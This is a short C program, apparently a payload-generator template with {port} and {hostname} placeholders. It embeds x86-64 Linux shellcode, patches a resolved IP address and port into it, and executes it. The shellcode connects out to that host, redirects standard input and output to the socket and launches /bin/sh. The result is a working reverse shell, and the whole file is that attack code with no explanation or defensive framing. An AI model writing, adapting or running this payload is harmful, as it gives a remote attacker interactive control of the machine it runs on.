#include<stdio.h>
#include<string.h>
#include<netdb.h>

char code[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x20\xfb\xc0\xa8\x01\xf4\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

int hostname_to_ip(char *, char *);

int main(int argc, char **argv){
	int port = {port};
	char hostname[] = "{hostname}";
	
	char portbyte[2];
	char ip[4];

	portbyte[0] = (port >> 8) & 0xFF;
	portbyte[1] = port & 0xFF;

	hostname_to_ip(hostname , ip);

	code[18] = portbyte[0];
	code[19] = portbyte[1];

	code[20] = ip[3];
	code[21] = ip[2];
	code[22] = ip[1];
	code[23] = ip[0];

	(*(void(*)())code)();

	return 0;
}

int hostname_to_ip(char* hostname , char* ip){
	struct hostent *he;
	struct in_addr **addr_list;
		 
	he = gethostbyname(hostname);
 
	addr_list = (struct in_addr **) he->h_addr_list;
	 
	ip[0] = (addr_list[0]->s_addr >> 24) & 0xFF;
	ip[1] = (addr_list[0]->s_addr >> 16) & 0xFF;
	ip[2] = (addr_list[0]->s_addr >> 8) & 0xFF;
	ip[3] = addr_list[0]->s_addr & 0xFF;
	 
	return 1;
}